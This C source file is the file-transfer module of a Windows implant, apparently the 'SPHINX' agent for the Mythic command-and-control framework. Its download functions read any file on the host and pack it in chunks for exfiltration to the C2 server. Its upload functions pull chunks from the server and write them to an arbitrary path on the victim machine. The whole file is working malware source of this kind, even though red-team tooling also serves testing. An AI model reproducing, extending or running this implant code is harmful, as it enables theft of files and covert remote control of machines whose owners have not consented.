#include "file_transfer.h"

#include "packer.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── Estado privado del subsistema (opaco: nadie fuera del .c lo toca) ── */

typedef struct {
    BOOL     active;
    char     task_uuid[37];
    char     file_id[37];      /* lo rellena Mythic cuando responde al INIT */
    HANDLE   hFile;
    uint32_t total_chunks;
    uint32_t chunk_num;        /* siguiente chunk a enviar */
} DownloadCtx;

typedef struct {
    BOOL     active;
    char     task_uuid[37];
    char     file_id[37];
    uint32_t chunk_num;        /* siguiente chunk a PEDIR (pull) */
    uint32_t total_chunks;     /* lo dice Mythic al responder el chunk 1 */
    HANDLE   hFile;
    char     path[512];
} UploadCtx;

static DownloadCtx g_dwld;
static UploadCtx   g_upld;

/* ── Helpers privados ── */

static void download_clear(void) {
    if (g_dwld.hFile != INVALID_HANDLE_VALUE)
        CloseHandle(g_dwld.hFile);
    g_dwld.hFile       = INVALID_HANDLE_VALUE;
    g_dwld.active      = 0;
    g_dwld.chunk_num   = 0;
    g_dwld.total_chunks = 0;
    g_dwld.file_id[0]  = '\0';
    g_dwld.task_uuid[0] = '\0';
}

static void upload_clear(void) {
    if (g_upld.hFile != INVALID_HANDLE_VALUE)
        CloseHandle(g_upld.hFile);
    g_upld.hFile       = INVALID_HANDLE_VALUE;
    g_upld.active      = 0;
    g_upld.chunk_num   = 0;
    g_upld.total_chunks = 0;
    g_upld.file_id[0]  = '\0';
    g_upld.task_uuid[0] = '\0';
    g_upld.path[0]     = '\0';
}

/* ── DOWNLOAD ── */

int file_download_active(void) {
    return g_dwld.active && g_dwld.file_id[0]  != '\0';
}

void file_download_reset(void) {
    download_clear();
}

int file_download_start(const char* task_uuid, const char* path, uint8_t* buf, size_t buf_cap, size_t* out_len) {
    (void)buf_cap;
    if (!task_uuid || !path || !buf || !out_len) return -1;
    if (g_dwld.active) return -1;

    int wlen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    if (wlen <= 0) return -1;
    LPWSTR wpath = (LPWSTR)malloc((size_t)wlen * sizeof(wchar_t));
    if (!wpath) return -1;
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wlen);

    HANDLE h = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    free(wpath);
    if (h == INVALID_HANDLE_VALUE) return -1;

    LARGE_INTEGER li;
    if (!GetFileSizeEx(h, &li)) {
        CloseHandle(h);
        return -1;
    }

    uint64_t sz = (uint64_t)li.QuadPart;
    uint32_t total_chunks = (uint32_t)((sz + CHUNK_SIZE - 1) / CHUNK_SIZE);

    g_dwld.active       = 1;
    g_dwld.hFile        = h;
    g_dwld.total_chunks = total_chunks;
    g_dwld.chunk_num    = 0;
    memcpy(g_dwld.task_uuid, task_uuid, 36);
    g_dwld.task_uuid[36] = '\0';
    g_dwld.file_id[0]   = '\0';

    size_t off = 0;
    pack_download_init(buf, &off, task_uuid, total_chunks, path, CHUNK_SIZE);
    *out_len = off;

    return 0;
}

int file_download_set_file_id(const char* file_id) {
    if (!g_dwld.active || !file_id) return -1;
    memcpy(g_dwld.file_id, file_id, 36);
    g_dwld.file_id[36] = '\0';
    return 0;
}

int file_download_next(uint8_t* buf, size_t buf_cap, size_t* out_len) {
    (void)buf_cap;
    if (!g_dwld.active) return -1;
    if (g_dwld.file_id[0] == '\0') return -1;

    uint8_t* rbuf = (uint8_t*)malloc(CHUNK_SIZE);
    if (!rbuf) return -1;

    DWORD bytes_read = 0;
    if (!ReadFile(g_dwld.hFile, rbuf, CHUNK_SIZE, &bytes_read, NULL)) {
        free(rbuf);
        download_clear();
        return -1;
    }

    if (bytes_read == 0) {                        /* EOF: descarga completa */
        free(rbuf);
        download_clear();
        return 0;
    }

    g_dwld.chunk_num++;

    size_t off = 0;
    pack_download_cont(buf, &off,
                       g_dwld.task_uuid,
                       g_dwld.chunk_num,
                       g_dwld.file_id,
                       rbuf, bytes_read,
                       CHUNK_SIZE);
    *out_len = off;
    free(rbuf);

    if (g_dwld.chunk_num >= g_dwld.total_chunks) {   /* ultimo chunk */
        download_clear();
    }
    return 1;
}

/* ── UPLOAD (pull-based) ── */

int file_upload_active(void) {
    return g_upld.active;
}

int file_upload_begin(const char* path, const char* file_id, const char* task_uuid) {
    if (!path || !file_id || !task_uuid) return -1;
    if (g_upld.active) return -1;

    int wlen = MultiByteToWideChar(CP_UTF8, 0, path, -1, NULL, 0);
    if (wlen <= 0) return -1;
    LPWSTR wpath = (LPWSTR)malloc((size_t)wlen * sizeof(wchar_t));
    if (!wpath) return -1;
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, wlen);

    HANDLE h = CreateFileW(wpath, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    free(wpath);
    if (h == INVALID_HANDLE_VALUE) return -1;

    g_upld.active      = 1;
    g_upld.hFile       = h;
    g_upld.chunk_num   = 0;      /* primer pull pedira chunk 1 */
    g_upld.total_chunks = 0;     /* aun desconocido hasta respuesta de Mythic */
    memcpy(g_upld.file_id, file_id, 36);
    g_upld.file_id[36]  = '\0';
    memcpy(g_upld.task_uuid, task_uuid, 36);
    g_upld.task_uuid[36] = '\0';
    size_t plen = strlen(path);
    if (plen >= sizeof(g_upld.path)) plen = sizeof(g_upld.path) - 1;
    memcpy(g_upld.path, path, plen);
    g_upld.path[plen] = '\0';
    fprintf(stderr, "[SPHINX] upload_begin: file_id=%s path=%s\n", g_upld.file_id, g_upld.path);
    return 0;
}

int file_upload_write(const uint8_t* data, uint32_t len) {
    if (!g_upld.active || g_upld.hFile == INVALID_HANDLE_VALUE || !data)
        return -1;

    DWORD written = 0;
    if (!WriteFile(g_upld.hFile, data, len, &written, NULL))
        return -1;
    return (written == len) ? 0 : -1;
}

int file_upload_set_total(uint32_t total_chunks) {
    if (!g_upld.active) return -1;
    g_upld.total_chunks = total_chunks;
    return 0;
}

int file_upload_pull_next(uint8_t* buf, size_t buf_cap, size_t* out_len) {
    (void)buf_cap;
    if (!g_upld.active) return -1;
    if (g_upld.file_id[0] == '\0') return -1;

    /* Si Mythic ya nos dijo el total y ya lo pedimos todo → terminar */
    if (g_upld.total_chunks > 0 && g_upld.chunk_num >= g_upld.total_chunks) {
        upload_clear();
        return 0;
    }

    g_upld.chunk_num++;   /* primer pull = chunk 1 (1-based) */

    size_t off = 0;
    pack_upload_pull(buf, &off,
                     g_upld.task_uuid,
                     g_upld.chunk_num,
                     g_upld.file_id,
                     g_upld.path, CHUNK_SIZE);
    *out_len = off;
    fprintf(stderr, "[SPHINX] upload_pull: chunk=%u file_id=%s len=%u\n",
            g_upld.chunk_num, g_upld.file_id, (unsigned)off);
    return 1;
}

void file_upload_end(void) {
    upload_clear();
}
